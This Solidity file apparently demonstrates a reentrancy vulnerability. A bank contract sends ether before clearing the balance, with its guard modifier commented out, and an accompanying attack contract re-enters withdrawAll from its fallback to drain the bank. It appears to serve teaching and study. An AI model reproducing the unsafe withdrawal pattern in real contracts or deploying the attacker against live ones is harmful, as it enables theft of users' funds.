//SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;

contract BankAtRisk {
    mapping(address => uint) private balanceOf;

    bool internal locked = false; //true after withdrawal
    event LogWithDraw(address, string);  
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }
    //function withdrawAll() public disableRentrancy {
    function withdrawAll() public payable {
        emit LogWithDraw(msg.sender, "Withdrawing from BankAtRisk");
        uint _balance = balanceOf[msg.sender];
        (bool success, ) = msg.sender.call{value: _balance}("");
        require(success, "Failed to send");  //require to send
        balanceOf[msg.sender] = 0;
    }
    modifier disableRentrancy() {
        require(!locked);  //before sending
        locked = true;     //toggle on
        _;
        locked = false;    //toggle off
    }
    function getBalance() view public returns(uint) {
        return address(this).balance;
    }
    function getBalanceOf(address addr) public view returns (uint) {
        return balanceOf[addr];
    }
}

contract AttackReentrancy {
    BankAtRisk private b;
    event LogReceive(address, string);

    constructor(address _b) {
        b = BankAtRisk(_b);
    }
    receive() external payable {
        emit LogReceive(address(b), "receiving in AttackRentrancy");
        if (address(b).balance >= 1 ether) {
            b.withdrawAll();
        }
    }
    function withdraw() external payable {
        require(msg.value >= 1 ether);
        b.deposit{value: 1 ether}();
        b.withdrawAll();
    }
    function getBalance() view public returns(uint) {
        return address(this).balance;
    }
}